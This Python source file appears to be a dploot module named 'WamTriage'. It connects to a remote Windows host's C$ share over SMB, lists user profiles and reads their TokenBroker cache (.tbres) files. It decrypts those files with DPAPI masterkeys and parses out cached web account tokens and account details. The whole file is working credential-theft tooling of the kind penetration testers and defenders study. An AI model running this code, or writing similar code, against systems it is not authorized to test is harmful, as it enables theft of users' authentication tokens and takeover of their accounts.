from base64 import b64decode
import json
import logging
import ntpath
from typing import Any, List
from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.triage.masterkeys import Masterkey
from impacket.structure import Structure, unpack

class TBRESVersion(Structure):
    structure = (
        ("Version", ">L=0"),
    )

    def __str__(self):
        return "%x" % self["Version"]
    
class TBRESKeyValue(Structure):
    key_value_type_def = {
        4:{"name":"Unsigned Int","size":4},
        5:{"name":"Unsigned Int","size":4},
        6:{"name":"Timestamp","size":8},
        7:{"name":"Unsigned Long","size":8},
        12:{"name":"String","size":4},
        13:{"name":"GUID","size":16},
        1025:{"name":"Content Identifier","size":0},
    }

    structure = (
        ("KeyType", ">L=0"),
        ("KeyLength", ">L=0"),
        ("_Key", "_-Key", 'self["KeyLength"]'),
        ("Key", ":"),
        ("ValueType", ">L=0"),
    )

    def __init__(self, data=None, alignment=0):
        self.additionnal_size = 0
        self.remaining = data
        super().__init__(data, alignment)
        if self["ValueType"] == 4:   # noqa: SIM114
            self["Data"] = super().unpack(">I", data[super().__len__():len(self)])
        elif self["ValueType"] == 5: 
            self["Data"] = super().unpack(">I", data[super().__len__():len(self)])
        elif self["ValueType"] == 6:   # noqa: SIM114
            self["Data"] = super().unpack(">Q", data[super().__len__():len(self)])
        elif self["ValueType"] == 7: 
            self["Data"] = super().unpack(">Q", data[super().__len__():len(self)])
        elif self["ValueType"] == 12:
            string_length = super().unpack(">I", data[super().__len__():len(self)])
            self["Data"] = super().unpack("%ss" % string_length, data[len(self):len(self)+string_length])
            self.additionnal_size = string_length
        elif self["ValueType"] == 13:
            self["Data"] = super().unpack("16s", data[super().__len__():len(self)]) 
        elif self["ValueType"] == 1025:
            if self["KeyLength"] > 1:
                remaining = self.remaining[super().__len__():]
                _length = unpack("I", remaining[0:4])
                version = TBRESVersion(remaining[4:])
                next_key_value = TBRESKeyValue(remaining[4+len(version):])
                try:
                    self["Data"] = "{}: {}".format(next_key_value["Key"].decode(), next_key_value["Data"].decode())
                except Exception:
                    self["Data"] = "{}: {}".format(next_key_value["Key"].decode(), next_key_value["Data"])
                self.additionnal_size=len(next_key_value)+len(version)+4
            else:
                self["Data"] = "None"    
        else:
            raise Exception(f"Unhandled TBRES ValueType: {self['ValueType']}")

        self.remaining = self.remaining[len(self):]


    def dump(self):
        print("Key: %s" % self["Key"])
        print("ValueType: {} = {}".format(self["ValueType"], self.key_value_type_def[self["ValueType"]]["name"]))
        print(f"Data: {self['Data']}")

    def __len__(self):
        size = 0
        size = super().__len__()
        size += self.key_value_type_def[self["ValueType"]]["size"]
        size += self.additionnal_size
        
        return size
        
    def __str__(self):
        try:
            if isinstance(self["Data"], int):
                return f"{self['Key'].decode()}: {self['Data']}"
            else:
                return f"{self['Key'].decode()}: {self['Data'].decode()}"
        except Exception:
            return f"{self['Key'].decode()}: {self['Data']}"

class TBRESResponseData:
    def __init__(self, winuser, data=None):
        self.winuser = winuser
        self.attribs = []
        if data is not None:
            self.version = TBRESVersion(data)
            
            remaining = data[len(self.version):]
            expiration = TBRESKeyValue(remaining)
            self.attribs.append(expiration)
            responses = TBRESKeyValue(expiration.remaining)
            if responses["Key"] != b"responses":
                remaining = responses.remaining
                while(len(remaining))>0:
                    element, remaining = self.get_tbres_element(remaining)
                    if element is None:
                        break
                    self.attribs.append(element)
            else:
                self.attribs.append(responses)

                _response_len = unpack("I", responses.remaining[0:4])
                version2 = TBRESVersion(responses.remaining[4:])
                unk = TBRESKeyValue(responses.remaining[4+len(version2):])
                
                _content_len = unpack("I", unk.remaining[0:4])
                version3 = TBRESVersion(unk.remaining[4:])
                remaining= unk.remaining[4+len(version3):]
                while(len(remaining))>0:
                    element, remaining = self.get_tbres_element(remaining)
                    if element is None:
                        break
                    if isinstance(element, List):
                        self.attribs += element
                    else:
                        self.attribs.append(element)

    def get_tbres_element(self,bytes_remaining):
        elem = TBRESKeyValue(bytes_remaining)
        if elem["Key"] in [b"WTRes_Error",b"error"]:
            return None, elem.remaining
        elif elem["Key"] == b"WTRes_Token":
            prop = TBRESKeyValue(elem.remaining)
            return elem, prop.remaining
        elif elem["Key"] == b"WTRes_Account":
            prop = TBRESKeyValue(elem.remaining)
            _element_len = unpack("I", prop.remaining[0:4])[0]
            version = TBRESVersion(prop.remaining[4:])
            remaining = prop.remaining[4+len(version):]
            properties = [elem, prop]
            while(len(remaining) > 0):
                prop = TBRESKeyValue(remaining)
                properties.append(prop)
                remaining = prop.remaining
            return properties, remaining
        else:
            _element_len = unpack("I", elem.remaining[0:4])[0]
            version = TBRESVersion(elem.remaining[4:])
            remaining = elem.remaining[4+len(version):]
            properties = [elem]
            while(len(remaining) > 0):
                
                try:
                    prop = TBRESKeyValue(remaining)
                except Exception:
                    prop = TBRESKeyValue(remaining[8:])
                properties.append(prop)
                remaining = prop.remaining
            return properties, remaining

    def dump(self):
        print("[TBRES FILE]")
        print("Version: %s" % self.version)
        for attrib in self.attribs:
            print(attrib)
        print()

class WamTriage:
    false_positive = [
        ".",
        "..",
        "desktop.ini",
        "Public",
        "Default",
        "Default User",
        "All Users",
    ]
    share = "C$"
    token_broker_cache_path = "Users\\{username}\\AppData\\Local\\Microsoft\\TokenBroker\\Cache"

    def __init__(
        self,
        target: Target,
        conn: DPLootSMBConnection,
        masterkeys: List[Masterkey],
        per_token_callback: Any = None,
    ) -> None:
        self.target = target
        self.conn = conn

        self._users = None
        self.looted_files = {}
        self.masterkeys = masterkeys

        self.per_token_callback = per_token_callback

    def triage_wam(self):
        tbres_responses_cache = []
        for user in self.users:
            tbres_responses_cache += self.triage_wam_for_user(user)

    def triage_wam_for_user(self, user):
        tbres_responses_cache = []
        tbc_user_path = self.token_broker_cache_path.format(username=user)
        tbc_dir = self.conn.remote_list_dir(self.share, tbc_user_path)
        if tbc_dir is None:
            return []
        for file in tbc_dir:
            filename = file.get_longname()
            if filename[-6:] ==".tbres" and filename not in self.false_positive and file.is_directory() == 0:
                logging.debug(f"Got {filename} cache file for user {user}")
                tbres_filepath = ntpath.join(tbc_user_path, filename)
                data_bytes = self.conn.readFile(self.share, tbres_filepath, looted_files=self.looted_files)
                if data_bytes is None:
                    continue
                decrypted_blob = self.decypt_tbres_file(data_bytes)
                if decrypted_blob is not None:
                    tbres_response_data = TBRESResponseData(winuser = user, data=decrypted_blob)
                    if self.per_token_callback is not None:
                        self.per_token_callback(tbres_response_data)
                    tbres_responses_cache.append(tbres_response_data)
        return tbres_responses_cache                

    def decypt_tbres_file(self, tbres_file_data_bytes):
        tbres_json_data = json.loads(tbres_file_data_bytes.decode("utf-16le").rstrip("\x00"))
        response_bytes = tbres_json_data["TBDataStoreObject"]["ObjectData"]["SystemDefinedProperties"]["ResponseBytes"]
        if not response_bytes["IsProtected"]:
            return None
        blob = b64decode(response_bytes["Value"])
        masterkey = find_masterkey_for_blob(blob, self.masterkeys)
        if masterkey is not None:
            return decrypt_blob(masterkey=masterkey, blob_bytes=blob)
            
        return None

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users

        self._users = self.conn.list_users(self.share)

        return self._users